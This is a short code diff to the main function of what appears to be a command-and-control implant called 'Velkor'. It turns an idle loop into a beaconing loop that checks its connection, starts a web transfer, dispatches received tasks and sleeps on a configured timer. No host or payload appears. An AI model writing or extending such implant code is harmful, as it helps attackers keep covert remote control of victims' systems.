@@ -6,11 +6,18 @@ D_SEC( B ) INT Main(
 ) {
     VELKOR_INSTANCE
 
-    VelkorInit( Parameter );
+    VelkorInit( Parameter );    
 
-    while( 1 ) {
-        SleepMain( 1000 * 5 );
-    }
+    do {
+        VkShow( "%s\n", Velkor->Session.Connected ? "TRUE" : "FALSE" );
+        
+        if ( !Velkor->Session.Connected ) {
+            if ( Web::TransferInit() )
+                Task::Dispatcher();
+
+            SleepMain( SleepConf.SleepTime );   
+        }
+    } while ( 1 );
 
     return 0;
 }
